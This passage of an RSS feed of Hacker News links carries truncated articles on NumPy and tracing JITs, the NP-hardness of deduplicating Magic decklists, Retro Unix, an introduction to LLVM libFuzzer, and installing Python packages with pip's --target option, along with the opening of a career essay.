<p>So far, we’ve seen that NumPy doesn’t solve any of Python’s fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It’s a pretty successful strategy – in my hands (<a href="https://www.moderndescartes.com/essays/vectorized_pagerank">1</a>, <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">2</a>), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves <a href="https://www.moderndescartes.com/essays/data_oriented_python/(https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/python3-gcc.html)">100-200x performance</a> over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.</p>
<p>Tracing <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JITs</a> promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.</p>
<p>(I should note that I’m most familiar with the tracing JITs used by TensorFlow and JAX. <a href="https://doc.pypy.org/en/latest/">PyPy</a> and <a href="https://numba.pydata.org/">Numba</a> are two alternate JIT implementations that have a longer history, but I don’t know enough about them to treat them fairly, so my apologies to readers.)</p>
<p>Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the <a href="https://en.wikipedia.org/wiki/FMA_instruction_set">fused multiply-add instructions</a> common to most modern computers), memory layouts can be optimized, and so on. TensorFlow’s <a href="https://www.tensorflow.org/guide/graph_optimization">Grappler</a> is one such implementation of this idea. Traces can also be <a href="https://en.wikipedia.org/wiki/Backpropagation">walked backwards</a> to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can <a href="https://jax.readthedocs.io/en/latest/notebooks/quickstart.html#Auto-vectorization-with-vmap">autovectorize traces</a>, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in <a href="https://www.tensorflow.org/js">Javascript</a>, <a href="https://www.tensorflow.org/tfx/guide/serving">C++</a>, or more.</p>
<p>Unsurprisingly, there’s a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn’t make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (<a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html">1</a>, <a href="https://jax.readthedocs.io/en/latest/notebooks/Common_Gotchas_in_JAX.html#python-control-flow-+-JIT">2</a>). I worked on <a href="https://blog.tensorflow.org/2018/07/autograph-converts-python-into-tensorflow-graphs.html">AutoGraph</a>, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The NumPy API’s specifically addresses Python’s performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that <a href="https://dl.acm.org/citation.cfm?id=3321441">machine learning is stuck in a rut</a> due to this NumPy monoculture.) In any case, tracing JITs built on top of …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moderndescartes.com/essays/data_oriented_python/">https://www.moderndescartes.com/essays/data_oriented_python/</a></em></p>]]>
            </description>
            <link>https://www.moderndescartes.com/essays/data_oriented_python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504947</guid>
            <pubDate>Thu, 17 Sep 2020 14:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deduplicating Decklists]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24504939">thread link</a>) | @umanwizard
<br/>
September 17, 2020 | http://justinjaffray.com/deduplicating-decklists/ | <a href="https://web.archive.org/web/*/http://justinjaffray.com/deduplicating-decklists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<p><small>17 Sep 2020</small></p><p>This is not going to be my normal kind of post, it’s not very focused, and
going to be a bit rambley, as I talk about a problem I thought about one day.</p>
<p>Magic: The Gathering is a card game where players construct decks, typically of
60 cards plus a 15 card sideboard, for 75 cards total.</p>
<p>Periodically, the company that makes the game,
Wizards of the Coast (WotC) publishes a
list of decks that did well recently.
Just recently they
<a href="https://magic.gg/news/esports-update-grand-finals-formats-decklist-hub-and-more">announced</a> that they were going to start doing this for their most recent digital offering of the game.
Stay with me! This isn’t a post about card games.
This list, however, is doctored: they want the data shown to be broad and not repetitive, so they perform some amount of deduplication on the data.
This means that if two “similar” decks do well, only one will be shown in the dump.
The linked article outlines what is meant by “similar:”</p>
<blockquote>
<p>We will be publishing lists from Standard Ranked, Traditional Standard Ranked, Historic Ranked, and Traditional Historic Ranked play queues. Like we do for Magic Online Leagues, we will be posting an example list for each category of deck that share a minimum number of cards: at least 55 of 75 cards (across main deck and sideboard) shared in Traditional (best of three games, or Bo3) or at least 45 of 60 main deck cards shared in best of one (Bo1). All lists published will have won at least six consecutive matches.</p>
</blockquote>
<p>This seemed to me like an interesting problem!
Given a raw set of decks that did well, how could we produce such a
deduplicated set of decks?</p>
<p>At a high level, we might envision the set of decks as a bunch of points in some
space, where points are closer together if the decks are more “similar” (for some
meaning of “similar” we haven’t made precise yet).</p>
<p><img src="http://justinjaffray.com/images/decks1.png">
</p>
<p>With a solution being a set of decks which “cover” the set of all other decks
(for some meaning of “cover” we haven’t made precise yet).</p>
<p><img src="http://justinjaffray.com/images/decks2.png">
</p>
<p>To be slightly more precise, given a set \(D\) of “decks,” we want to find a
minimal set \(D^\prime \subseteq D\) such that every \(d \in D\) is
“sufficiently close” to some \(d^\prime \in D^\prime\).</p>
<p>Let’s define what we mean by “deck” and “sufficiently close.” We can represent
decks as maps from the set of cards \(C\) to some integer \(n \in \mathbb N\)
denoting how many copies of a given card are in the deck.
We might also think of this as an \(\mathbb N\) vector indexed by \(C\), which can be denoted \(\mathbb N ^ C\).
That’s all to say, you should think of one of these decks as just a sequence of numbers denoting how many of a given card were included,
where each index corresponds to a particular card:
\[
\langle
\ldots, 4 \ldots, 2, \ldots, 1, \ldots, 4, \ldots
\rangle
\]
The sequence is finite, since there’s a finite number of Magic cards (about twenty thousand).</p>
<p>For “closeness” of two decks, per the statement above from WotC we are interested in the <em>total number of different cards between them</em>.
That is, the distance between two decks \(a\) and \(b\) is the sum
of the absolute difference of the quantity of each card:
\[
|a - b| = \sum_{c \in C} \left| a_c - b_c \right|.
\]
This way of measuring distance is pretty natural, and satisfies some
nice properties:</p>
<ol>
<li>\(|a - b| = 0\) if and only if \(a = b\),</li>
<li>\(|a - b| = |b - a|\) (symmetry), and</li>
<li>\(|a - c| \le |a - b| + |b - c|\) (triangle inequality).</li>
</ol>
<p>A notion of distance that satisfies properties 1, 2, and 3 happens to be called a <em>metric</em>,
and a set combined with a metric on that set is called a <em>metric space</em>.
This particular metric we’ve stumbled on is actually well known, and is called
the \(\ell_1\)-norm.</p>
<p>We’ll be a little abstract here, but when you hear “metric” you should just
think “way of thinking about distance.”
If you look at the three properties, they’re all pretty natural things you’d want from a measure of “distance:”</p>
<ol>
<li>says the only thing “zero distant” from a thing is the thing itself,</li>
<li>says that \(a\) is exactly as far from \(b\) as \(b\) is from \(a\), and</li>
<li>says two things can’t be further away than the sum of their distances to a third thing.</li>
</ol>
<p>There are lots of metrics people use for various things.
Another one is the \(\ell_2\)-norm, which you might also know as Euclidean distance:
if you have two points in Euclidean space and draw a straight line between
them, their \(\ell_2\)-distance is the length of that line.
In two-dimensional space,
\[
|a - b| = \sqrt{(a_x - b_x)^2 + (a_y - b_y)^2}
\]
Which is just the Pythagorean theorem.
For our problem we’re concerned with the \(\ell_1\)-distance, as described above.</p>
<p>Why bother introducting this abstraction?
Well, mostly I just thought it was kind of neat, but
I think making this kind of hop upwards the abstraction hierarchy can be useful to understand problems sometimes,
because it lets us make concrete the link between our actual problem, \(\ell_1\)-distance of 20,000-dimensional \(\mathbb N\)-points, weird, scary, hard to visualize, to
a problem which is easier to conceptualize: \(\ell_2\)-distance of two-dimensional points.</p>
<p><img src="http://justinjaffray.com/images/decks2.png">
</p>
<p>Seen this way, this kind of picture isn’t just a helpful mental model,
but it actually has a real, quantifiable link to the original problem we were trying to solve.</p>
<p>When thinking about this problem, it’s not completely accurate, but it’s not
too bad to just imagine the \(\ell_2\) picture above.</p>
<p>Remember that the thing we’re primarily interested in is going to be
all the points “sufficiently close” to a given point,
where “sufficiently close” means “has distance less than some \(r\).”
It turns out this thing has a name, the <em>(closed) ball of radius \(r\) centered at \(p\)</em> is
the set of points \(x\) satisfying \(|x - p| \le r\).
A “ball” is basically what you expect in most contexts, in 2D space, under the \(\ell_2\)-norm (our diagram above)
a ball is a (filled in) circle.
In 3D it’s a sphere.
In “deck-space,” it’s the set of decks you can make from \(p\) by adding and removing at most \(r\) cards.</p>
<p>This lets us rephrase our problem a bit more generally.
Given a metric space \(M\), a finite set of points \(P \subseteq M\), and a radius \(r\),
we want to find a set \(P^\prime \subseteq P\) such that every \(p \in P\)
is within some ball of radius \(r\) centered at some \(p^\prime \in P^\prime\).</p>
<p>So, can we solve <em>this</em> problem, in a <em>general</em> metric space, efficiently?
It turns out we actually can’t!
Why did I bother going down this road of generalization if it was going to lead to a dead-end?
Well, it’s the road I took when thinking about this problem and it’s my blog,
and also it’s actually easy to show that the problem at this level of generality is NP-hard.
As a reminder, to show this is NP-hard for metric spaces in general, we must:</p>
<ol>
<li>Fix some metric space, and</li>
<li>show that computing the size of the cover is NP-hard by showing that an
efficient solution to <em>that</em> would allow us to solve some other NP-hard
problem.</li>
</ol>
<p>Consider a graph \(G\):</p>
<p><img src="http://justinjaffray.com/images/petersen.png">
</p>
<p>The <em>dominating set problem</em> is this:
given a graph \(G = (V, E)\), find a set \(V^\prime\) of vertices such that every \(v \in V\) is adjacent to some
\(v^\prime \in V^\prime\).
That is, we want to choose some set of vertices that “cover” all other vertices: every other vertex is adjacent to one we chose.
Finding a minimum dominating set is a well known NP-complete problem,
and already smells similar to our problem!</p>
<p>If we define a binary function on the vertices of \(G\):
\[
d(a, b) = \text{the length of the shortest path between $a$ and $b$},
\]
it turns out \(d\) is a metric (check this yourself, it’s easy)!</p>
<p>If we take this metric and set \(r\) to 1, we’ve exactly recreated the
dominating set problem, which, being NP-complete, means our problem
in a general metric space is also NP-complete.
While this doesn’t mean that our original problem about Magic decks is
NP-complete (though it’s evidence that suggests this might be the case),
it does mean that any algorithm that <em>only</em> uses the properties of a metric space
probably doesn’t have an efficient solution.</p>
<p>When asked about this, my friend <a href="https://www.its.caltech.edu/~fshinko/">Forte</a>
found a nice reduction from 3SAT to the deck problem if \(r\) is at least four.
The gist of it is this:</p>
<ul>
<li>Given an instance of 3SAT with \(n\) variables \(\{v_1, \ldots, v_n\}\), let your set of “cards” be
\(\{x_1, \ldots, x_n\} \cup \{y_1, \ldots, y_n\}\).</li>
<li>For each clause \(a \vee b \vee c\), take the vector that is 1 at \(x_i\) for the variable for \(a\) if \(a\) is not negated, and -1 if it is, and the same for \(b\) and \(c\).</li>
<li>For each variable \(v_i\), add three vectors that are all 2 at \(y_i\), and -1, 0, and 1 at \(x_i\), respectively (the choice of the one at 1 or -1 will correspond to whether we take that variable to be true or not, and the 0 one is there to ensure you need to take at least one of them).</li>
<li>This set of decks has a cover of size \(n\) (for radius 4) if and only if the 3SAT instance was satisfiable (the numbers can be tweaked to support radii larger than 4).</li>
</ul>
<p>If \(r\) is one then there actually <em>is</em> an efficient solution,
because in this case the adjacency graph is bipartite, and a dominating set of a
bipartite graph can be found in polynomial time.
I don’t know if there’s an efficient solution when \(r\) is two or three.</p>
<p>Ok, well, we are probably not going to find an efficient solution then, how about an
inefficient solution?
Wizard of the Coast must have <em>some</em> way of doing that, since they regularly
publish such deduplicated decklists.
The likely answer, I’d guess, is that they don’t fret about finding the minimum cover,
and just do something like “output uncovered decks until none remain.”
Or possibly there are just few enough decklists that they have an excel spreadsheet
or something that makes sure their stated invariants are upheld. Unsure!
If you work at WotC and somehow came across this post I’d be curious to learn the real answer.</p>
<p>I can’t say how they actually do it, but there are plenty of heuristic methods
for solving this kind of thing that they might employ if you’re actually
interested in finding a good solution.</p>
<p>Techniques like
<a href="http://justinjaffray.com/branch-and-bound/">Branch and Bound</a> or simulated</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://justinjaffray.com/deduplicating-decklists/">http://justinjaffray.com/deduplicating-decklists/</a></em></p>]]>
            </description>
            <link>http://justinjaffray.com/deduplicating-decklists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504939</guid>
            <pubDate>Thu, 17 Sep 2020 14:20:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Retro Unix Operating System]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24504891">thread link</a>) | @elvis70
<br/>
September 17, 2020 | https://www.singlix.com/runix | <a href="https://web.archive.org/web/*/https://www.singlix.com/runix">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="390">

            
<p>
<span lang="en-us"><span face="Arial" color="#003366" size="2">
Retro UNIX 8086 v1 operating system has been developed by Erdogan Tan as a 
special purposed derivation of original UNIX v1 (by Ken Thompson, 1970-1972).</span></span></p>

<p>
<span face="Arial" color="#003366" size="2"><span lang="en-us">Source code has 
been ported from PDP-11 Unix assembler syntax to Microsoft Macro Assembler 
(INTEL x86 real mode) syntax and original unix source code has been modified for 
IBM PC/AT compatibility with standard ROM BIOS functions, without 
dropping/removing original UNIX v1 multitasking (time-sharing) features.</span></span></p>

<p><span lang="en-us">
<span face="Arial" size="2" color="#003366">Retro UNIX 386 v1 is 32 bit (80386 
protected mode) version of Retro UNIX 8086 v1. Retro UNIX 386 v1 operating 
system kernel and binaries have been written in assembly language syntax of 
Netwide Assembler (NASM). </span>
</span></p>

<p>
<span face="Arial" color="#003366" size="2"><span lang="en-us">Retro UNIX is a 
predecessor to SINGLIX operating system project.<br>
&nbsp;</span></span></p>
            </div></div>]]>
            </description>
            <link>https://www.singlix.com/runix</link>
            <guid isPermaLink="false">hacker-news-small-sites-24504891</guid>
            <pubDate>Thu, 17 Sep 2020 14:16:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to LLVM LibFuzzer]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24503889">thread link</a>) | @fcambus
<br/>
September 17, 2020 | https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Fuzzing is a software testing method that involves passing malformed
data as input to the program and monitoring it for misbehavior.
Today, fuzzing is one of the most effective ways to find software security problems.
In 2014, Michał Zalewski presented American Fuzzy Lop, the first coverage
guided fuzzer. This started the modern world of fuzzing solutions and
techniques on the market.</p>

<p>In this article, we will discuss libFuzzer, a LLVM utility that allows you to integrate fuzzing
methodology into your libraries, and briefly introduce techniques to maximize the effectiveness
of catching problems.</p>



<p><a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer</a>
is part of the <a href="https://llvm.org/">LLVM</a>
package. It allows you to integrate the
coverage-guided fuzzer logic into your C / C++ application. A crucial feature
of libFuzzer is its close integration with
<a href="https://clang.llvm.org/docs/SanitizerCoverage.html">Sanitizer Coverage</a>
and bug detecting sanitizers, namely:
<a href="https://clang.llvm.org/docs/AddressSanitizer.html">Address Sanitizer</a>,
<a href="https://clang.llvm.org/docs/LeakSanitizer.html">Leak Sanitizer</a>,
<a href="https://clang.llvm.org/docs/MemorySanitizer.html">Memory Sanitizer</a>,
<a href="https://clang.llvm.org/docs/ThreadSanitizer.html">Thread Sanitizer</a>
and <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">Undefined Behavior Sanitizer</a>.
The use of these projects
ensures that a wide range of memory corruption bugs and undesired
application behavior are detected. A few examples of these are: Heap/Stack/Global Out Of Bounds,
Use After Free, Use After Return, Uninitialized Memory Reads, Memory Leaks
or Uninitialized Mutex Use.</p>

<p>Everything is provided with a relatively low performance and memory overhead.
The project requires merely a functional LLVM 5.0 toolchain or newer (release date: 07 Sep 2017).</p>



<p>AFL has been on the market since 2014 and has been able to detect
over 1000 different types of software errors.  When the development of
the <a href="https://github.com/google/AFL">original AFL repository</a> stalled for
a long time, the community created a fork called
<a href="https://github.com/AFLplusplus/AFLplusplus">AFL++</a> in 2018.
The development of Google hosted project was eventually resumed
by a different team of Google employees (as Michał Zalewski changed
his workplace). Therefore, there are two independent versions of AFL
in active development today.</p>

<p>The design of AFL is primarily based on code coverage through tracing code path execution
(with SanitizerCoverage), then providing feedback to the fuzzer (again with SanitizerCoverage callbacks),
and then using genetic algorithms to craft new inputs
(using <a href="https://en.wikipedia.org/wiki/Standard_streams">standard input</a>) to widen the code coverage.
The <a href="https://github.com/google/AFL#2-the-afl-fuzz-approach">simplified algorithm of AFL</a> is as follows:</p>

<ol>
<li>Load user-supplied initial test cases into the queue,</li>
<li>Take the next input file from the queue,</li>
<li>Attempt to trim the test case to the smallest size that doesn’t alter the measured behavior of the program,</li>
<li>Repeatedly mutate the file using a balanced and well-researched variety of traditional fuzzing strategies,</li>
<li>If any of the generated mutations results in a transition to a new state recorded by the instrumentation, add mutated output as a new entry in the queue.</li>
<li>Go to point 2.</li>
</ol>

<p>The readers might ask, why create a new fuzzer?</p>

<p>First of all, AFL was incapable of handling different types of coverage, such as
tracking the evaluation of comparison instructions (in C <code>==</code>, <code>&gt;</code>, <code>&lt;</code>, <code>!=</code>, etc.).
Next, AFL was unaware of tracking the evaluation of standard (and non-standard)
functions that return certain values depending on the input, such as
the functions for comparing strings (in C <code>strcmp()</code>, <code>strncmp()</code>, etc.).
Finally, AFL was not sufficiently flexible to integrate in environments that
accept input from a different source than the <code>standard input</code>.</p>

<p>The Google employees created a new fuzzer to overcome all the mentioned limitations
and take advantage of the bug detecting features that were already present in LLVM.
The libFuzzer philosophy was to create a tool that operates
similarly to unit testing. We write a small fuzzing program (called the “harness”)
and create programming environment to quickly integrate it into projects
that consists of callable set of functions, typically API of a library.
The fuzzer input is provided as parameters to a regular C function (instead of stdin),
and if possible the fuzzing process is run in persistent mode that
avoids respawning it for every input.</p>

<p>The simplest integration of libFuzzer is as follows:</p>

<pre><code>// fuzz_API.cpp
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  DoSomethingWithMyAPI(Data, Size);
  return 0;
}
</code></pre>

<p>There are two arguments to the <code>LLVMFuzzerTestOneInput()</code> function, Data and Size.
This is the buffer of a fixed length that then has to be processed by our
unit testing-like program and passed on to our API.</p>

<p>That said, libFuzzer is tailored towards:</p>

<ul>
<li>Fuzzing libraries and their APIs, rather than standalone programs.</li>
<li>The behavior should be as deterministic as possible. The same input must result in the same output.</li>
<li>The called library should avoid exiting (by <code>exit()</code> or raising signals) for valid code paths.</li>
<li>It should avoid mutating the global state as otherwise it will confuse the fuzzer.</li>
<li>It should evaluate as quickly as possibly, returning to the fuzzer.</li>
<li>It may use threads, but all newly spawned threads should be joined before returning to libFuzzer.</li>
<li>Collecting diverse sources of coverage as productive as possible.</li>
</ul>

<p>AFL is better for one type of projects and libFuzzer for another one.
For example, projects that are not designed as libraries
are hard to integrate with libFuzzer, while entry barrier to AFL testing
can be lower. It is a matter of rebuilding the software and running the fuzzer as-is.</p>

<p>As we presented above libFuzzer operates entirely inside the memory while AFL
feeds the fuzzed program with specially crafted files and passed them to its input.</p>



<p>The fuzzing process begins with the construction of test corpora.
In the case of libFuzzer, this is not necessarily true - it
can generate entirely random input. Of course, this implies practically
no code coverage at the start, and many hours of work before the first
input passing initial integrity checks is produced. Therefore, it is
worth having even a few/odd test cases to start with.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/fuzzing_corpora.svg" alt="Fuzzing corpora"></p>

<p>The goal of minimizing the test files is to get as much code coverage as possible
with as small input file size as possible. The relation is simple:
the smaller the file, the more executions per second can be achieved. It is worth adding that
there is also a process of minimizing a single input file. This operation aims
to remove any redundant data from the test case causing the crash to capture
what exactly happened. According to the libFuzzer documentation, the minimum speed
at which it is worthwhile to start meaningful fuzzing with a prepared body is
1000 iterations per second.</p>

<p>Crash management usually boils down to deduplicating a set of test cases by
comparing the function call stack or a stack trace. Due to limited fuzzer
information during a crash, there are different approaches to solve the
problem here. libFuzzer does not have a module for managing test cases,
and every new fuzzing job is a “clean card” for it. The user must automate
this process by writing the report parser himself/herself.</p>

<p>Readers are encouraged to create and maintain their test corpora - in
the long run, and this is much better than using the “ready-made”
ones found on the Internet or, as mentioned earlier, generating one from scratch.
It is worth categorizing the corpus per application (in case of a single
application) or per file type - if we test many different programs, using
the same file formats.</p>

<p>The more diverse the initial test data, the better. The corpus continuously
evolves during fuzzing: you find inputs that pass through previously unknown
paths in the code. During the operation, smaller files push large files
out of the corpus (if they provide equivalent code coverage). Of course,
you find test cases that cause the program to terminate. The process of
merging the corpus is nothing more than minimizing the sum of the sets:
the corpora that started fuzzing and the newly created test cases.</p>



<p>As mentioned earlier, to use libFuzzer in your projects, you need to prepare
a lightweight library entry code.</p>

<p>Let’s see at a real world example from the LLVM libFuzzer test-suite, an
example called
<a href="https://github.com/llvm/llvm-project/blob/master/compiler-rt/test/fuzzer/SingleStrcmpTest.cpp">SingleStrcmpTest.cpp</a></p>

<pre><code>// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.
// See https://llvm.org/LICENSE.txt for license information.
// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception

// Simple test for a fuzzer. The fuzzer must find a particular string.
#include &lt;cstdint&gt;
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;cstring&gt;

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  if (Size &gt;= 7) {
    char Copy[7];
    memcpy(Copy, Data, 6);
    Copy[6] = 0;
    if (!strcmp(Copy, "qwerty")) {
      fprintf(stderr, "BINGO\n");
      exit(1);
    }
  }
  return 0;
}
</code></pre>

<p>In this example, we have two conditions for triggering the bug (in our case, calling <code>exit(2)</code> and exiting):</p>

<ul>
<li>Size of the input buffer is larger or equal to 7 bytes.</li>
<li>The first 6 bytes store the sequence <code>"qwerty"</code>, followed by <code>\0</code>.</li>
<li>The rest of the input buffer is ignored.</li>
</ul>

<p>We note that there is no <code>main()</code> function in the program, as it is provided directly by the
libFuzzer library. Besides that, the code contains SanCov instrumentation that feedbacks the fuzzer.</p>

<p>This fuzzer uses the <code>strcmp(3)</code> function interceptors that are integrated through Address Sanitizer
into the coverage reporting mechanism in libFuzzer. Thus, there are two ways of executing the program,
with Address Sanitizer enabled and without, and we can see the difference. This also illustrates that
even if the code path is relatively simple, AFL would be totally incapable of guessing code
to break <code>strcmp(3)</code> conditionals in the code and passing random inputs, possibly even never breaking
the program in a finite time.</p>

<p>This happens inside
<a href="https://github.com/llvm/llvm-project/blob/master/compiler-rt/lib/sanitizer_common/sanitizer_common_interceptors.inc">sanitizer_common_interceptors.inc</a>:</p>

<pre><code>DECLARE_WEAK_INTERCEPTOR_HOOK(__sanitizer_weak_hook_strcmp, uptr called_pc,
                              const char *s1, const char *s2, int result)

INTERCEPTOR(int, strcmp, const char *s1, const char *s2) {
  void *ctx;
  COMMON_INTERCEPTOR_ENTER(ctx, strcmp, s1, s2);
  unsigned char c1, c2;
  uptr i;
  for (i = 0;; i++) {
    c1 = (unsigned char)s1[i];
    c2 = (unsigned char)s2[i];</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/">https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503889</guid>
            <pubDate>Thu, 17 Sep 2020 12:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I think I want to drop modern Python packages into a single program]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24503292">thread link</a>) | @pcr910303
<br/>
September 17, 2020 | https://utcc.utoronto.ca/~cks/space/blog/python/PipDropInInstall | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/python/PipDropInInstall">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>How I think I want to drop modern Python packages into a single program</h2>

	<p><small>September 16, 2020</small></p>
</div><div><p>For reasons beyond the scope of this blog entry, I'm considering
augmenting <a href="https://github.com/siebenmann/exim-attachment-logger">our Python program to log email attachment information
for Exim</a> to
use <a href="https://github.com/decalage2/oletools">oletools</a> to peer
inside MS Office files for indications of bad things. Oletools is
not packaged by Ubuntu as far as I can see, and in any case it would
be an older version, so we would need to add the oletools Python
packages ourselves.</p>

<p>The official oletools install instructions talk about using either
pip or setup.py. As a general rule, we're very strongly against
installing anything system-wide except through Ubuntu's own package
management system, and the environment our Python program runs in
doesn't really have a home directory to use pip's --user option, so
the obvious and simple pip invocations are out. I've used a setup.py
approach to install a large Python package into a specific directory
hierarchy in the past (Django), and it was a big pain, so I'd like
not to do it again.</p>

<p>(Nor do we want to learn about how to build and maintain Python
virtual environments, and then convert how we run this Python program
to use one.)</p>

<p>After some looking at pip's help output I found the '<code>pip install
--target &lt;directory&gt;</code>' option and tested it a bit. This appears to
do more or less what I want, in that it installs oletools and all
of its dependencies into the target directory. The target directory
is also littered with various metadata, so we probably don't want
to make it where the program's normal source code lives. This means
we'll need to arrange to run the program so that <code>$PYTHONPATH</code> is
set to the target directory, but that's a solvable problem.</p>

<p>(This '<code>pip install</code>' invocation does write some additional pip
metadata to your <code>$HOME</code>. Fortunately it actually does respect the
value of the <code>$HOME</code> environment variable, so I can point that at
a junk directory and then delete it afterward. Or I can make <code>$HOME</code>
point to my target directory so everything is in one place.)</p>

<p>All of this is not quite as neat and simple as dropping an <code>oletools</code>
directory tree in the program's directory, <a href="https://utcc.utoronto.ca/~cks/space/blog/python/UpdatingToRarfile30">in the way that I could
deal with needing the rarfile module</a>, but then
again oletools has a bunch of dependencies and pip handles them all
for me. I could manually copy them all into place, but that would
actually create a sufficiently cluttered program directory that I
prefer a separate directory even if it needs a <code>$PYTHONPATH</code> step.</p>

<p>(Some people will say that setting <code>$PYTHONPATH</code> means that I should
go all the way to a virtual environment, but that would be a lot
more to learn and it would be more opaque. But looking into this
a bit did lead to me learning that <a href="https://docs.python.org/3/tutorial/venv.html">Python 3 now has standard
support for virtual environments</a>.)</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/python/PipDropInInstall</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503292</guid>
            <pubDate>Thu, 17 Sep 2020 11:24:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Toward a Technological Cage for the Masses]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 75 (<a href="https://news.ycombinator.com/item?id=24503179">thread link</a>) | @sT370ma2
<br/>
September 17, 2020 | https://cheapskatesguide.org/articles/techno-cage.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/techno-cage.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/techno-cage.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503179</guid>
            <pubDate>Thu, 17 Sep 2020 11:05:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[To All the Jobs I Had Before]]>
            </title>
            <description>
<![CDATA[
Score 304 | Comments 80 (<a href="https://news.ycombinator.com/item?id=24502983">thread link</a>) | @ingve
<br/>
September 17, 2020 | https://elisabethirgens.github.io/notes/2020/09/to-all-jobs-i-had-before/ | <a href="https://web.archive.org/web/*/https://elisabethirgens.github.io/notes/2020/09/to-all-jobs-i-had-before/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>My career as a developer started 5 years ago. Before that I have 15 years work experience from other roles, and I‘ve been thinking about <strong>what I learnt</strong> from all those jobs I had before.</p>

<hr>

<h3 id="questioning-predefined-tasks-">Questioning predefined tasks 🤔</h3>

<p><strong>ELDERLY CARE</strong> was my first full time job, providing care services for senior citizens in their homes. The shift started with receiving a work list printed on paper. These were public services that had been granted based on certain requirements, so it was pretty much an official work list. But…</p>

<p>I learnt that the details could be outdated, misunderstood, or sometimes just not the most important task to prioritize that day. I became critical of instructions written by people who where not there, and tried to understand individual needs instead. Also: an entire year of hard core training in empathy.</p>

<hr>

<h3 id="systems-thinking-️">Systems thinking ♻️</h3>

